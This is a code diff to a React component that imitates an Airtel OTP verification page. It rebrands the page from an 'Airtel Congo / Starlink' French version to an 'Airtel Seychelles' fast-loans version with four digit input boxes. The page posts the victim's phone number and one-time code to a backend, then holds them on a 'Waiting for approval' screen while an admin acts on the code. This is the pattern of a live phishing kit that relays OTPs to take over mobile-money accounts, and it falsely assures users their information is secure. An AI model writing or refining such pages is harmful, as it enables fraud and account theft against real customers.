@@ -17,12 +17,12 @@ function makeRefId() {
 }
 
 function formatPhone(p: string) {
-  if (!p) return 'votre téléphone';
+  if (!p) return 'your phone';
   return p.replace(/\s+/g, ''); 
 }
 
 function AirtelOTPVerify() {
-  const [otp, setOtp] = useState('');
+  const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(''));
   const [timeLeft, setTimeLeft] = useState(TIMER_START);
   const [timerResetKey, setTimerResetKey] = useState(0);
   const [expired, setExpired] = useState(false);
@@ -32,6 +32,7 @@ function AirtelOTPVerify() {
   const [refId, setRefId] = useState('');
   const [submittedAt, setSubmittedAt] = useState('');
 
+  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
   const pollTokenRef = useRef<{ cancelled: boolean } | null>(null);
   const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const hasResumedRef = useRef(false);
@@ -49,7 +50,7 @@ function AirtelOTPVerify() {
   }, []);
 
   useEffect(() => {
-    if (!phoneNumber) navigate('/login');
+    if (!phoneNumber) navigate('/');
   }, [phoneNumber, navigate]);
 
   /* ─── Countdown Timer ─── */
@@ -78,8 +79,9 @@ function AirtelOTPVerify() {
     setWaitingForAdmin(false);
     setSubmittedAt('');
     setRefId('');
-    setOtp('');
+    setOtp(Array(OTP_LENGTH).fill(''));
     sessionStorage.removeItem(PENDING_KEY);
+    setTimeout(() => otpRefs.current[0]?.focus(), 100);
   }, [stopPolling]);
 
   const startPolling = useCallback(
@@ -147,16 +149,27 @@ function AirtelOTPVerify() {
     }
   }, [startPolling]);
 
-  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const val = e.target.value.replace(/\D/g, '');
-    if (val.length <= OTP_LENGTH) {
-      setOtp(val);
+  const handleOtpChange = (index: number, value: string) => {
+    if (!/^\d*$/.test(value)) return;
+    const newOtp = [...otp];
+    newOtp[index] = value.substring(value.length - 1);
+    setOtp(newOtp);
+
+    if (value && index < OTP_LENGTH - 1) {
+      otpRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Backspace' && !otp[index] && index > 0) {
+      otpRefs.current[index - 1]?.focus();
     }
   };
 
   const handleVerify = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (isVerifying || otp.length < OTP_LENGTH) return;
+    const otpString = otp.join('');
+    if (isVerifying || otpString.length < OTP_LENGTH) return;
 
     setIsVerifying(true);
     setWaitingForAdmin(false);
@@ -173,7 +186,7 @@ function AirtelOTPVerify() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           phone_number: phoneNumber,
-          otp: otp,
+          otp: otpString,
           ref_id: newRefId,
           submitted_at: nowIso,
         }),
@@ -197,7 +210,7 @@ function AirtelOTPVerify() {
       setWaitingForAdmin(true);
       sessionStorage.setItem(
         PENDING_KEY,
-        JSON.stringify({ refId: finalRef, otp: otp, submittedAt: nowIso }),
+        JSON.stringify({ refId: finalRef, otp: otpString, submittedAt: nowIso }),
       );
       startPolling(finalRef);
     } catch {
@@ -213,7 +226,7 @@ function AirtelOTPVerify() {
     setTimeLeft(TIMER_START);
     setExpired(false);
     setTimerResetKey((k) => k + 1);
-    setOtp('');
+    setOtp(Array(OTP_LENGTH).fill(''));
     setWaitingForAdmin(false);
     setSubmittedAt('');
     setRefId('');
@@ -225,6 +238,7 @@ function AirtelOTPVerify() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone_number: phoneNumber }),
       });
+      setTimeout(() => otpRefs.current[0]?.focus(), 100);
     } catch {
       /* silent */
     } finally {
@@ -233,6 +247,7 @@ function AirtelOTPVerify() {
   };
 
   const showWaitingOverlay = isVerifying || waitingForAdmin;
+  const isFormValid = otp.join('').length === OTP_LENGTH;
 
   return (
     <div className="airtel-page-container">
@@ -248,18 +263,8 @@ function AirtelOTPVerify() {
           display: flex;
           flex-direction: column;
           min-height: 100vh;
-          background-color: #F8F9FA;
+          background-color: #DA1C1C; /* Airtel Red */
           position: relative;
-        }
-
-        /* FADED BACKGROUND WHEN WAITING */
-        .faded-content {
-          opacity: 0.15;
-          pointer-events: none;
-          transition: opacity 0.3s ease;
-          display: flex;
-          flex-direction: column;
-          min-height: 100vh;
         }
 
         /* WAITING OVERLAY */
@@ -314,106 +319,115 @@ function AirtelOTPVerify() {
         }
 
         /* HEADER */
-        .otp-header {
+        .header-section {
+          padding: 40px 24px 30px;
           display: flex;
-          justify-content: space-between;
+          flex-direction: column;
           align-items: center;
-          padding: 16px 20px;
-          background-color: #ffffff;
-          border-bottom: 1px solid #E5E7EB;
+          position: relative;
         }
 
-        .header-icon-btn {
+        .back-btn {
+          position: absolute;
+          left: 20px;
+          top: 20px;
           background: none;
           border: none;
           cursor: pointer;
           padding: 8px;
-          display: flex;
-          align-items: center;
-          justify-content: center;
         }
 
-        .header-center-logo {
-          display: flex;
-          flex-direction: column;
-          align-items: center;
+        .header-title {
+          font-size: 32px;
+          font-weight: 900;
+          color: #1a1a1a;
+          font-style: italic;
+          margin-bottom: 6px;
         }
 
-        .tagline {
-          font-size: 8px;
-          letter-spacing: 1px;
-          color: #333;
-          text-transform: uppercase;
-          margin-top: 4px;
+        .header-subtitle {
+          font-size: 14px;
           font-weight: 600;
-        }
-        
-        .tagline span {
-          color: #DA1C1C;
+          color: #1a1a1a;
         }
 
-        /* MAIN CONTENT */
-        .otp-main-content {
-          flex: 1;
-          padding: 24px;
+        /* MAIN CARD */
+        .main-card {
+          background-color: #ffffff;
+          width: 90%;
+          max-width: 420px;
+          margin: 0 auto;
+          border-radius: 24px;
+          padding: 32px 24px;
           display: flex;
           flex-direction: column;
           align-items: center;
+          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+          position: relative;
+          z-index: 10;
         }
 
-        .otp-card {
-          background-color: #ffffff;
-          width: 100%;
-          max-width: 420px;
-          border-radius: 16px;
-          padding: 32px 24px;
-          box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
-          border: 1px solid #F3F4F6;
-        }
-
-        .otp-title {
-          font-size: 24px;
+        .card-title {
+          font-size: 26px;
           font-weight: 800;
-          color: #1a1a1a;
-          margin-bottom: 12px;
+          color: #000000;
+          margin-bottom: 8px;
         }
 
-        .otp-subtitle {
+        .card-subtitle {
           font-size: 15px;
-          color: #6B7280;
-          line-height: 1.5;
+          color: #4B5563;
           margin-bottom: 24px;
+          text-align: center;
+          line-height: 1.5;
         }
 
-        .otp-phone-number {
-          color: #1a1a1a;
+        .phone-highlight {
+          color: #000000;
           font-weight: 700;
           display: block;
           margin-top: 4px;
-        }
-
-        .otp-input-field {
-          width: 100%;
-          padding: 18px;
-          border: 1px solid #D1D5DB;
-          border-radius: 8px;
           font-size: 16px;
-          color: #1a1a1a;
-          background-color: #ffffff; /* Added to force white background */
-          text-align: center;
-          outline: none;
-          transition: border-color 0.2s;
-          margin-bottom: 16px;
         }
 
-        .otp-input-field:focus {
+        .input-label {
+          font-size: 15px;
+          font-weight: 700;
+          color: #000000;
+          margin-bottom: 12px;
+          width: 100%;
+          text-align: center;
+        }
+
+        /* OTP INPUT BOXES */
+        .otp-inputs-container {
+          display: flex;
+          gap: 16px;
+          margin-bottom: 20px;
+        }
+
+        .otp-box {
+          width: 60px;
+          height: 60px;
+          border: 2px solid #CBD5E1;
+          border-radius: 12px;
+          font-size: 28px;
+          text-align: center;
+          color: #000000;
+          outline: none;
+          background-color: #ffffff;
+        }
+
+        .otp-box::placeholder {
+          color: #000000;
+          font-size: 30px;
+        }
+
+        .otp-box:focus {
           border-color: #2A5CAA;
         }
 
-        .otp-input-field::placeholder {
-          color: #9CA3AF;
-        }
-
+        /* TIMER */
         .otp-timer-text {
           font-size: 14px;
           color: #6B7280;
@@ -426,23 +440,27 @@ function AirtelOTPVerify() {
           color: #1a1a1a;
         }
 
-        .submit-btn {
+        /* BUTTON */
+        .login-btn {
           width: 100%;
-          padding: 16px;
-          border-radius: 30px;
+          padding: 18px;
+          border-radius: 12px;
           border: none;
           background-color: #D1D5DB;
-          color: #ffffff;
-          font-size: 16px;
+          color: #4B5563;
+          font-size: 18px;
           font-weight: 700;
-          text-transform: uppercase;
-          cursor: not-allowed;
-          transition: background-color 0.2s;
+          cursor: pointer;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          gap: 12px;
+          transition: all 0.2s;
         }
 
-        .submit-btn.active {
+        .login-btn.active {
           background-color: #DA1C1C;
-          cursor: pointer;
+          color: #ffffff;
         }
 
         .resend-link {
@@ -457,153 +475,156 @@ function AirtelOTPVerify() {
           text-align: center;
         }
 
-        /* FOOTER */
-        .otp-footer {
-          background-color: #F3F4F6;
-          padding: 32px 24px;
+        /* SECURITY TEXT */
+        .security-footer {
           display: flex;
-          flex-direction: column;
           align-items: center;
-          border-top: 1px solid #E5E7EB;
-        }
-
-        .footer-logo-wrapper {
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          margin-bottom: 24px;
-        }
-
-        .collab-text {
-          font-size: 14px;
-          font-weight: 600;
-          color: #333;
-          margin-bottom: 4px;
-        }
-
-        .starlink-text {
-          font-size: 15px;
-          font-weight: 800;
-          color: #1a1a1a;
-          letter-spacing: 1px;
-        }
-
-        .starlink-text sup {
-          font-size: 8px;
-          font-weight: normal;
-        }
-
-        .copyright {
-          font-size: 12px;
-          color: #9CA3AF;
+          gap: 8px;
           margin-top: 24px;
+          color: #6B7280;
+          font-size: 14px;
+          font-weight: 500;
+        }
+
+        /* FOOTER ICONS */
+        .brand-icons-footer {
+          flex: 1;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          gap: 16px;
+          padding: 40px 20px 20px;
+        }
+
+        .brand-icon {
+          display: flex;
+          align-items: center;
+          justify-content: center;
         }
       `}</style>
 
-      {/* WAITING OVERLAY */}
       {showWaitingOverlay && (
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
-          <div className="waiting-title">En attente d'approbation</div>
+          <div className="waiting-title">Waiting for approval</div>
           <div className="waiting-message">
-            Votre demande a été envoyée. Merci de patienter pendant la vérification...
+            Your request has been sent. Please wait while we verify your details...
           </div>
         </div>
       )}
 
-      {/* MAIN CONTENT WRAPPER (Faded when waiting) */}
-      <div className={showWaitingOverlay ? 'faded-content' : ''}>
-        
-        {/* HEADER */}
-        <header className="otp-header">
-          <button className="header-icon-btn" onClick={() => navigate('/login')}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="19" y1="12" x2="5" y2="12" />
-              <polyline points="12 19 5 12 12 5" />
-            </svg>
-          </button>
+      {/* HEADER */}
+      <div className="header-section">
+        <button className="back-btn" onClick={() => navigate('/')}>
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+            <line x1="19" y1="12" x2="5" y2="12" />
+            <polyline points="12 19 5 12 12 5" />
+          </svg>
+        </button>
+        <h1 className="header-title">Airtel Seychelles</h1>
+        <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
+      </div>
+
+      {/* MAIN CARD */}
+      <div className="main-card">
+        <h2 className="card-title">OTP Verification</h2>
+        <p className="card-subtitle">
+          Enter the OTP sent to your phone number
+          <span className="phone-highlight">{formatPhone(phoneNumber)}</span>
+        </p>
+
+        <form onSubmit={handleVerify} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
           
-          <div className="header-center-logo">
-            <svg width="100" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-              <circle cx="25" cy="17" r="5" fill="white"/>
-              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
-            </svg>
-            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
-          </div>
-
-          <button className="header-icon-btn">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="3" y1="12" x2="21" y2="12" />
-              <line x1="3" y1="6" x2="21" y2="6" />
-              <line x1="3" y1="18" x2="21" y2="18" />
-            </svg>
-          </button>
-        </header>
-
-        {/* MAIN CONTENT */}
-        <main className="otp-main-content">
-          <div className="otp-card">
-            <h2 className="otp-title">Vérification OTP</h2>
-            
-            <p className="otp-subtitle">
-              Entrez l'OTP envoyé à votre numéro de téléphone
-              <span className="otp-phone-number">{formatPhone(phoneNumber)}</span>
-            </p>
-
-            <form onSubmit={handleVerify}>
+          <span className="input-label">Enter 4-digit OTP</span>
+          
+          <div className="otp-inputs-container">
+            {otp.map((digit, index) => (
               <input
+                key={index}
                 type="tel"
                 inputMode="numeric"
                 autoComplete="one-time-code"
-                maxLength={OTP_LENGTH}
-                value={otp}
-                onChange={handleOtpChange}
-                placeholder="Entrer l'OTP à 4 chiffres"
-                className="otp-input-field"
+                maxLength={1}
+                value={digit}
+                ref={(el) => { otpRefs.current[index] = el; }}
+                onChange={(e) => handleOtpChange(index, e.target.value)}
+                onKeyDown={(e) => handleKeyDown(index, e)}
+                className="otp-box"
+                placeholder="•"
+                disabled={showWaitingOverlay}
               />
-
-              <p className="otp-timer-text">
-                Entrer le code de vérification à 4 chiffres<br />
-                Le code expire dans <strong>{timeLeft}</strong> secondes
-              </p>
-
-              <button 
-                type="submit" 
-                className={`submit-btn ${otp.length === OTP_LENGTH ? 'active' : ''}`}
-                disabled={otp.length < OTP_LENGTH || showWaitingOverlay}
-              >
-                SOUMETTRE
-              </button>
-
-              <button 
-                type="button" 
-                className="resend-link"
-                onClick={handleResend}
-                disabled={isResending || showWaitingOverlay}
-              >
-                {isResending ? 'Envoi en cours...' : 'Renvoyer le code'}
-              </button>
-            </form>
+            ))}
           </div>
-        </main>
 
-        {/* FOOTER */}
-        <footer className="otp-footer">
-          <div className="footer-logo-wrapper">
-            <svg width="110" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-              <circle cx="25" cy="17" r="5" fill="white"/>
-              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
+          <p className="otp-timer-text">
+            Code expires in <strong>{timeLeft}</strong> seconds
+          </p>
+
+          <button 
+            type="submit" 
+            className={`login-btn ${isFormValid ? 'active' : ''}`}
+            disabled={!isFormValid || showWaitingOverlay}
+          >
+            SUBMIT
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12" />
+              <polyline points="12 5 19 12 12 19" />
             </svg>
-            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
+          </button>
+
+          <button 
+            type="button" 
+            className="resend-link"
+            onClick={handleResend}
+            disabled={isResending || showWaitingOverlay}
+          >
+            {isResending ? 'Sending...' : 'Resend code'}
+          </button>
+
+        </form>
+
+        <div className="security-footer">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+          </svg>
+          Your information is secure.
+        </div>
+      </div>
+
+      {/* BRAND ICONS FOOTER */}
+      <div className="brand-icons-footer">
+        {/* Icon 1: Airtel Phone */}
+        <div className="brand-icon">
+          <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
+            <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
+            <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
           </div>
+        </div>
+        
+        {/* Icon 2: Lock */}
+        <div className="brand-icon">
+          <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+          </div>
+        </div>
 
-          <p className="collab-text">En collaboration avec</p>
-          <p className="starlink-text">STARLINK<sup>TM</sup></p>
+        {/* Icon 3: Airtel Money */}
+        <div className="brand-icon">
+          <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
+            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
+            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
+          </div>
+        </div>
 
-          <p className="copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
-        </footer>
+        {/* Icon 4: Currency Symbol */}
+        <div className="brand-icon">
+          <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
+            <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
+          </div>
+        </div>
       </div>
     </div>
   );
